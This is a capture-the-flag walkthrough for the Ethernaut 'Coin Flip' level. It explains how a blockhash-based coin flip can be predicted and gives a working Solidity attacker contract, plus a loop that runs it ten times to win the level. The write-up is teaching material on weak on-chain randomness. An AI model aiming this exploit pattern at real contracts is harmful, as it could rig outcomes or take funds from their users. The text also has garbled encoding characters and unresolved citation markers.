# Coin Flip ‚Äì Level‚ÄØ3 Walkthrough

Welcome to **Coin Flip**, the third level of the **Ethernaut** wargame by [OpenZeppelin](https://ethernaut.openzeppelin.com/), focused on exploiting **pseudo-randomness vulnerabilities**.

---

## Challenge Objective

You are given a contract that mimics a coin flip, generating guesses using a flawed random mechanism:

```solidity
function flip(bool _guess) public returns (bool) { ‚Ä¶ }
```

Your goals:

* Predict the next coin flip outcome
* Achieve **10 consecutive wins**
* Submit the instance to complete the level

---

## Prerequisites

* **MetaMask** is installed and connected to a testnet
* **Test ETH** (e.g., Goerli, Sepolia)
* Familiarity with **browser DevTools** and **JS console**
* Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)

---

## Getting Started

### 1. **Load the Level**

* Visit [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
* Select **"Coin Flip"**
* Click **‚ÄúGet new instance‚Äù**
* Confirm the MetaMask transaction to deploy your unique contract

This injects a global `contract` object into your browser console.

## Walkthrough ‚Äì Step by Step

### Step 1: Understand the Flipping Logic

```js
await contract.flip(true) // or false
await contract.consecutiveWins()
```

Internally, it calculates:

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1;
```

Since both `blockValue` and `FACTOR` are known, you can **replicate** the result. ([blog.blockmagnates.com][1], [coinsbench.com][2], [dev.to][3], [securitypills.news][4])

---

### Step 2: Create Attack Contract

Craft a Solidity contract that imports `CoinFlip` and predicts each flip:

```solidity
pragma solidity ^0.8.0;
interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
  function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
  ICoinFlip public target;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _target) {
    target = ICoinFlip(_target);
  }

  function attack() external {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    bool guess = (blockValue / FACTOR) == 1;
    target.flip(guess);
  }
}
```

This mimics the contract‚Äôs `flip()` logic and calls it with the **correct outcome**. ([gist.github.com][5])

---

### Step 3: Deploy & Execute

1. **Deploy** this attack contract via Remix (Injected Provider).
2. **Run** the `attack()` method **10 times**, either manually or in a loop:

   ```js
   for (let i = 0; i < 10; i++) {
     await attacker.attack();
   }
   ```
3. Confirm each flip increases `consecutiveWins`. Eventually, it should hit 10.

---

### Step 4: Submit the Level

Once `consecutiveWins() == 10`, go back to the Ethernaut UI, click **‚ÄúSubmit instance‚Äù**, and confirm the transaction. üéâ

## What You Learn

* Block values like `blockhash` and `block.number` are not secure entropy sources
* You can replicate pseudorandom logic to manipulate outcomes
* Executing calls within your own contract ensures the same block context. ([gist.github.com][5], [notonlyowner.com][6])
